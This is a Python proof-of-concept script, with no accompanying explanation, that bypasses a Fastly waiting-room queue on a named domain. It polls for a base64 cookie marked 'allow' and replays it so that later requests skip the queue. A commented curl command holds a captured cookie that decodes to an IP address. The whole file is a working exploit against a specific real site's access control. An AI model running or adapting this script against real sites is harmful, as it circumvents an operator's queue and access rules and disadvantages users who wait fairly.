import time
import base64

import requests

queue_skip = False
prev_cookie = ""

while True:
    resp = requests.get("http://gocyberit.com.global.prod.fastly.net/", allow_redirects=False, cookies={"waiting_room": prev_cookie})
    print("response cookies", resp.cookies)
    print("request cookies", resp.request.headers.get("Cookie"))
    if (wr := resp.cookies.get("waiting_room")) and wr != prev_cookie:
        new_cookie = base64.b64decode(wr).decode("utf8")
        is_skip = "allow" in new_cookie
        if is_skip:
            print("Got queue skip cookie")
            break
        prev_cookie = wr

    time.sleep(30)
print("[!] Queue skip cookie", prev_cookie)

poc_no_skip = requests.get("http://gocyberit.com.global.prod.fastly.net/")
print("In Queue?", "wait" in base64.b64decode(poc_no_skip.cookies.get("waiting_room")).decode("utf8"), base64.b64decode(poc_no_skip.cookies.get("waiting_room")).decode("utf8"))
print("Skipping Queue...")
poc_skip = requests.get("http://gocyberit.com.global.prod.fastly.net/", cookies={"waiting_room": prev_cookie}, allow_redirects=False)
print("In Queue?", "wait" in base64.b64decode(poc_skip.cookies.get("waiting_room")).decode("utf8"), base64.b64decode(poc_skip.cookies.get("waiting_room")).decode("utf8"))

# curl -i -s -k -X $'GET' \
#     -H $'Host: gocyberit.com.global.prod.fastly.net' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' -H $'Sec-GPC: 1' -H $'Referer: http://gocyberit.com.global.prod.fastly.net/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
#     -b $'waiting_room=ZGVjPXdhaXQmZXhwPTE2NjgyODcxMDAmdWlkPTQ1LjMuNjUuMTg3JmtpZD1rZXkxJnNpZz0weDJhYjkyNjdlMTFjNTIxYTk4YjlmZTE5ZTM0YmE1MjFhODkzNTE5NzZlYmMyNjBhZGZkNmVjMGViOWY1NWRjODc=' \
#     $'http://gocyberit.com.global.prod.fastly.net/'